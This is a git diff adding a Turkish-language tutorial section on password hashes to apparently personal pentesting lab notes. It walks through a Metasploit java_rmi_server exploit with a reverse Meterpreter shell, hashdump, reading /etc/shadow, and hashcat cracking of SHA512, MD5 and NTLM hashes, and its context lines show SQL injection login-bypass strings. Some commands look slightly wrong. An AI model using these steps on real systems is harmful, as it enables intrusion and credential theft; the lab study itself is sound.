@@ -109,6 +109,16 @@
   - [ZAP](#ZAP)
   - [SQL Enjeksiyonu](#SQL-Enjeksiyonu)
   - [Login By-Pass](#Login-By-Pass)
+- [23-Hashes](#23-Hashes)
+  - [Linux Hashes](#Linux-Hashes)
+  - [Windows Hashes](#Windows-Hashes)
+  - [Sistemi Hackledikten Sonra Hashleri Öğrenme](#Sistemi-Hackledikten-Sonra-Hashleri-Öğrenme)
+  - [Kali Hash Öğrenme](#Kali-Hash-Öğrenme)
+  - [Hashcat](#Hashcat)
+    - [Kali Hash Kırma](#Kali-Hash-Kırma)
+    - [Metasploitable Hash Kırma](#Metasploitable-Hash-Kırma)
+    - [Windows Hash Kırma](#Windows-Hash-Kırma)
+    - [Hatalar](#Hatalar)
 # 1-VPN DNS MAC 
 
 VPN (Virtual Personal Network)
@@ -1045,4 +1055,88 @@ Kullanıcı adı:```admin'#``` , Şifre:```herhangibirşifre```
 | Kullanıcı Adı | ' or "=" |
 | --- | --- |
 | Şifre | ' or "=" | 
+
+# Hashes
+  
+### Linux Hashes
+
+> ### MD5
+```root:$1$/aupf...:0:0:root:/root:/bin/bash``` 
+* ```$ 1 $``` ile başlıyorsa MD5 kullanılarak şifrelenmiş demektir
+
+> ### SHA512
+```root:$6$MUwe5...:0:0:root:/root:/bin/bash```
+* ```$ 6 $``` ile başlıyorsa SHA512 kullanılarak şifrelenmiş demektir
+
+### Windows Hashes
+
+```admin:500:B34CE...A1:ABC123ABC12:::```
+* ```admin```: Kullanıcı Adı
+* ```500```: Kullanıcı Grubu (500: Admin Grubu)
+* ```B34C3...A1```: LM
+* ```ABC123ABC12```: NTLM 
+* ```LM```: Şifrede harf varsa o harflerin hepsini büyük harfe çeviri eğer 14 karakterden büyükse ilk 14 karakteri alır
+
+! ```NTLM LM'den daha güvenilirdir```
+
+### Sistemi Hackledikten Sonra Hash'leri Öğrenme 
+
+1.```nmap``` çalıştırarak açıkları buluyoruz örneğin ```java_rmi_server``` açığı var
+``` 
+msfconsole
+use exploit/multi/handler/misc/java_rmi_server
+show payloads
+set payload java/meterpreter/reverse_tcp
+show options
+set rhost <HedefIP>
+exploit
+sessions -l
+session -1
+```
+2. Sistemi Hackledikten Sonra 
+```hashdump``` Hashleri gösterir
+3.  Eğer ```hashdump``` çalışmazsa
+```run post/linux(ya da windows)/gather/hashdump```
+
+### Kali Sistemi Hackledikten Sonra Hash Öğrenme
+
+1. ```/``` içindeyken
+2. ```cat /etc/passwd``` kullanıcı(kali) şifrelerini gösterir
+3. ```cat /etc/shadow``` Kullanıcıların şifrelerinin hashlenmiş halini gösterir
+4. ```unshadow /etc/passwd /etc/shadow``` şifre ve hashleri birleştirerek gösterir
+  
+### HASHCAT
+
+```Hashcat bir çok şifrelenmiş dosya, sistem, kripto cüzdan vb. şeylerin şifrelerini kırmaya yaran framework```
+
+```apt-get install hashcat``` hashcat'i yükler
+```hashcat --help``` çalıştırıyoruz ve moduna bakıyoruz ```hashcat --help | grep 512 (SHA512 için)``` diyerek sadece 512'leri listeleyebiliriz
+
+![](https://github.com/ahmetnuysal/Cyber-Security/blob/3e4f0ff428baabc79bff59ab06abbf1a21aebd2c/Websitesi%20Pentesting/Pict/WhatsApp%20Image%202022-09-01%20at%2013.23.05.jpeg)
+
+! Sistem hash'i kırarken ```operating system``` seçmemiz gerekiyor
+
+> ### Kali Hash Kırma
+
+```hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttrack.txt``` 
+* ```-m 1800```: $ 6 $ (SHA512) sistemler için mod
+* ```-m 500```: $ 1 $ (MD5) sistemler için mod
+* ```mykalihash.txt```: Hash'imizi kaydettiğimiz dosya
+* ```/usr/share/wordlist/fasttrack.txt```: Wordlistimiz
+
+> ### Metasploitable Hash Kırma
+
+```hashcat -m 500 mylinuxhash.txt /usr/share/wordlist/fasttrack.txt> # Metasploitable Hash Kırma```
+
+> ### Windows Hash Kırma
+
+```hashcat -m 1000 mywindowshash.txt /usr/share/wordlist/fasttrack.txt```
+* ```-m 1000```: NTLM sistemler için mod
+
+> ### Hatalar
+
+1. ```All hashes found in potfile``` hatası alırsak, daha önce bu hash kırılmış demektir
+```hashcat -m 1800 mykalihash.txt /usr/share/wordlist/fasttrack.txt --show``` diyerek daha önceden kırılmış hash sonuçlarını görebiliriz
+2. ```Not enough allocatable device memory for this attack``` hatası alırsak, RAM'imiz yetersiz demektir 4GB RAM yeterli olacaktır
+3. ```Appraching final keyspace workload adjusted``` hatası alırsak, hash kırılamadı demektir
 
